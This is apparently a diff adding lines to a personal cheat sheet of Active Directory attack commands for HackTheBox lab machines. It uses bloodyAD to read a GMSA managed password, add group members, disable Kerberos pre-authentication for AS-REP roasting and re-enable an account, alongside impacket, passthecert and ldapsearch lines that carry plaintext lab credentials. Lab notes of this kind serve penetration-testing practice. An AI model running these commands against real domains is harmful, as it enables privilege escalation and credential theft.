@@ -1500,3 +1500,13 @@ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -targe
 impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name livestep -computer-pass 1loggbz -dc-ip 10.129.229.56﻿
 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.229.56﻿
 ldapsearch -H ldap://10.129.25.166 -x -LLL -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"| grep -i info
+
+# GMSA
+bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.129.222.121 -k get object 'GMSA01$' --attr msDS-ManagedPassword 	# GMSA get Object - Kerberos TGT
+bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add groupMember "SERVICEMANAGERS" "P.Rosa" 	## GenericWrite, instead netrpc - Kerberos TGT
+bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH 	# ASREPROAST - Kerberos TGT
+bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE	# # ACTIVATE DISABLE ACCOUNT - Kerberos TGT
+
+ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt	# List users 
+
+
